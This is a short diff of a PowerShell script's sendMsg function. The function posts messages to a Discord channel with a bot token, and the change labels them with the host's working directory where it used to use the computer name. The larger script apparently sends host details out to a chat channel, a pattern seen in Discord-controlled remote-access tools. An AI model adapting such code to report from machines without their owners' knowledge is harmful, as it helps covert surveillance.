@@ -1201,6 +1201,7 @@ function sendMsg {
     $url = "https://discord.com/api/v9/channels/$chan/messages"
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", "Bot $token")
+    $dir = $PWD.Path
 
     if ($Embed) {
         $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
@@ -1209,22 +1210,15 @@ function sendMsg {
         Write-Host "Embed sent to Discord"
         $jsonPayload = $null
     }
-
     if ($Message) {
-        $limitedMessage = $Message
-        if ($Message.Length -gt 1999) {
-            $limitedMessage = $Message.Substring(0, 1999)
-        }
-        $jsonBody = @{
-            "username" = "$env:COMPUTERNAME"
-            content = $limitedMessage
-        } | ConvertTo-Json
-        $webClient.Headers.Add("Content-Type", "application/json")
-        $response = $webClient.UploadString($url, "POST", $jsonBody)
-        Write-Host "Message sent to Discord"
-        $Message = $null
+            $jsonBody = @{
+                "content" = "$Message"
+                "username" = "$dir"
+            } | ConvertTo-Json
+            $webClient.Headers.Add("Content-Type", "application/json")
+            $response = $webClient.UploadString($url, "POST", $jsonBody)
+            Write-Host "Message sent to Discord"
     }
-
 }
 
 
